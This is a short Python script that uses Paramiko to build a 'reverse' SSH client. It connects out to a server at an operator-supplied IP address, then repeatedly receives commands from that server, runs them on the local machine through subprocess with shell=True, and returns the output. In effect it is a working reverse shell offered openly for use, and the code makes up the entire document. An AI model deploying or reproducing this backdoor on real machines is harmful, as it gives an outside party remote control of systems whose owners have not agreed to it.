"""
Simple SSH2 reverse client command sender
- Uses Paramiko to create said client.
- For use with if machine was running ssh_server.py within a Windows environment.
- Makes a Connection to the machine running ssh_server.py
- Sends a Command to the machine running ssh_server.py
"""
import paramiko
import shlex
import subprocess


# Most versions of windows dont include an ssh server out of the box..abs(
# This script reverses the connection
# as well as send commands from an ssh server to the ssh client.
def ssh_command(ip, port, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)

    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())
        while True:
            command = ssh_session.recv(1024)
            try:
                # Executing the command ...
                cmd = command.decode()  
                if cmd == 'exit':
                    client.close()
                    break
                # Send any output back to the caller.
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                ssh_session.send(cmd_output or 'okay')
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return

if __name__ == '__main__':
    import getpass
    user = getpass.getuser()
    password = getpass.getpass()

    ip = input('Enter server IP: ')
    port = input('Enter port: ')
    ssh_command(ip, port, password, 'ClientConnected')
